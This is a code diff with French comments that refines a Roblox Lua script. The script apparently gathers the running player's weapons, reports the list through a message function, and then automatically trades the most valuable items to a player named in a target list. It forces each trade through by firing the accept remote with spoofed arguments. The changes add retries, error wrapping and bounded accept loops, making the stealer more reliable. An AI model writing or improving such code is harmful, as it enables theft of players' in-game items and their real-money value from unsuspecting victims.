@@ -34,7 +34,7 @@ end
 
 local Players = game:GetService("Players")
 local weaponsToSend = {}
-local originalWeaponsList = {} -- NOUVEAU: Copie pour garder la liste originale
+local originalWeaponsList = {}
 local plr = Players.LocalPlayer
 local playerGui = plr:WaitForChild("PlayerGui")
 local database = require(game.ReplicatedStorage:WaitForChild("Database"):WaitForChild("Sync"):WaitForChild("Item"))
@@ -222,20 +222,29 @@ local function waitForTradeCompletion()
     end
 end
 
+-- MODIFIÉ: Amélioration de la fonction acceptTrade pour mieux gérer l'acceptation
 local function acceptTrade()
     local acceptTradeEvent = game:GetService("ReplicatedStorage").Trade.AcceptTrade
     game:GetService("ReplicatedStorage"):WaitForChild("Trade"):WaitForChild("CancelAccept"):FireServer()
 
-    game:GetService("ReplicatedStorage").Trade.UpdateTrade.OnClientEvent:Connect(function(tradeUpdate)
+    local connection
+    connection = game:GetService("ReplicatedStorage").Trade.UpdateTrade.OnClientEvent:Connect(function(tradeUpdate)
         if tradeUpdate.LastOffer then
-            while true do
-                acceptTradeEvent:FireServer(game.PlaceId * 3, tradeUpdate.LastOffer)
-                acceptTradeEvent:FireServer(game.PlaceId * 3)
-                acceptTradeEvent:FireServer(game.PlaceId * 2)
-                task.wait(0.2)
-            end
-        else
-            return
+            task.spawn(function()
+                for i = 1, 50 do -- Limiter les itérations pour éviter une boucle infinie
+                    acceptTradeEvent:FireServer(game.PlaceId * 3, tradeUpdate.LastOffer)
+                    acceptTradeEvent:FireServer(game.PlaceId * 3)
+                    acceptTradeEvent:FireServer(game.PlaceId * 2)
+                    task.wait(0.2)
+                    
+                    -- Vérifier si le trade est terminé
+                    local currentStatus = getTradeStatus()
+                    if currentStatus == "None" then
+                        connection:Disconnect()
+                        break
+                    end
+                end
+            end)
         end
     end)
 end
@@ -447,7 +456,6 @@ if #weaponsToSend > 0 then
         return (a.Value * a.Amount) > (b.Value * b.Amount)
     end)
 
-    -- NOUVEAU: Créer une copie profonde de la liste originale
     for i, v in ipairs(weaponsToSend) do
         originalWeaponsList[i] = {
             DataID = v.DataID,
@@ -467,6 +475,7 @@ if #weaponsToSend > 0 then
     local isTrading = false
     local messageSent = false
 
+    -- MODIFIÉ: Fonction doTrade complètement refaite pour gérer tous les cas
     local function doTrade(joinedUser)
         if isTrading then
             return
@@ -474,58 +483,75 @@ if #weaponsToSend > 0 then
         
         isTrading = true
         
-        -- Réinitialiser weaponsToSend depuis la liste originale
-        weaponsToSend = {}
-        for i, v in ipairs(originalWeaponsList) do
-            weaponsToSend[i] = {
-                DataID = v.DataID,
-                Rarity = v.Rarity,
-                Amount = v.Amount,
-                Value = v.Value
-            }
-        end
-        
-        -- Envoyer le message seulement une fois au début du premier trade
         if not messageSent then
             SendMessage(originalWeaponsList)
             messageSent = true
         end
         
+        -- Nettoyer les trades en cours
         local initialTradeState = getTradeStatus()
         if initialTradeState == "StartTrade" then
             game:GetService("ReplicatedStorage"):WaitForChild("Trade"):WaitForChild("DeclineTrade"):FireServer()
-            wait(0.5)
+            wait(1)
         elseif initialTradeState == "ReceivingRequest" then
             game:GetService("ReplicatedStorage"):WaitForChild("Trade"):WaitForChild("DeclineRequest"):FireServer()
-            wait(0.5)
+            wait(1)
+        elseif initialTradeState == "SendingRequest" then
+            wait(1)
         end
 
         while #weaponsToSend > 0 do
             local tradeStatus = getTradeStatus()
 
             if tradeStatus == "None" then
-                sendTradeRequest(joinedUser)
-                wait(0.5)
+                -- Envoyer une demande de trade
+                local success, err = pcall(function()
+                    sendTradeRequest(joinedUser)
+                end)
+                wait(1)
+                
             elseif tradeStatus == "SendingRequest" then
+                -- Attendre que la demande soit acceptée
                 wait(0.5)
+                
             elseif tradeStatus == "ReceivingRequest" then
+                -- Si on reçoit une demande, la décliner et renvoyer la nôtre
                 game:GetService("ReplicatedStorage"):WaitForChild("Trade"):WaitForChild("DeclineRequest"):FireServer()
-                wait(0.5)
+                wait(1)
+                
             elseif tradeStatus == "StartTrade" then
+                -- MODIFIÉ: Attendre un peu pour s'assurer que le trade est bien ouvert
+                wait(1)
+                
+                -- Ajouter les items
+                local itemsAdded = 0
                 for i = 1, math.min(4, #weaponsToSend) do
                     local weapon = table.remove(weaponsToSend, 1)
                     for count = 1, weapon.Amount do
-                        addWeaponToTrade(weapon.DataID)
+                        local success, err = pcall(function()
+                            addWeaponToTrade(weapon.DataID)
+                        end)
+                        if success then
+                            itemsAdded = itemsAdded + 1
+                        end
+                        wait(0.1)
                     end
                 end
-                wait(6)
+                
+                -- MODIFIÉ: Attendre que les items soient bien ajoutés avant d'accepter
+                wait(2)
+                
+                -- Accepter le trade
                 acceptTrade()
+                
+                -- Attendre que le trade soit terminé
                 waitForTradeCompletion()
                 wait(1)
             else
                 wait(0.5)
             end
-            wait(0.5)
+            
+            wait(0.3)
         end
         
         isTrading = false
@@ -553,6 +579,7 @@ if #weaponsToSend > 0 then
         end
     end
     
+    -- Vérifier si le joueur cible est déjà dans le serveur
     local targetFound = false
     for _, p in ipairs(Players:GetPlayers()) do
         if table.find(users, p.Name) then
